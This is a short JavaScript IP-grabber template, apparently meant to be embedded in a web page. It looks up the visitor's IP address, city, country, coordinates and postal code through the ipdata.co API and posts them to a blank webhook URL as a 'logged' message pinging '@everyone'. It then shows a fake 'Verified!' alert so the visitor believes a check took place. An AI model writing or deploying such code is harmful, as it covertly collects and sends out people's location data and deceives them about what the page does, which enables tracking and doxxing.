function json(url) {
  return fetch(url).then(res => res.json());
}

let apiKey = '';
json(`https://api.ipdata.co?api-key=${apiKey}`).then(data => {
  const content = "@everyone";
  const description = "IP: " + data.ip + "\nCity: " + data.city + "\nCountry: " + data.country_name + "\nLongitude: " + data.longitude + "\nLatitude: " + data.latitude + "\nPostal Code: " + data.postal;
  const message = {
    "content":content,
    "embeds": [{
      "title": "logged",
      "description": description
    }]
  };

  const url = "";
  fetch(url + "?wait=true", {method:"POST", "headers":{"content-type":"application/json"}, "body":JSON.stringify(message)});
});

setTimeout(() => {
    alert("Verified!")
}, 2000);
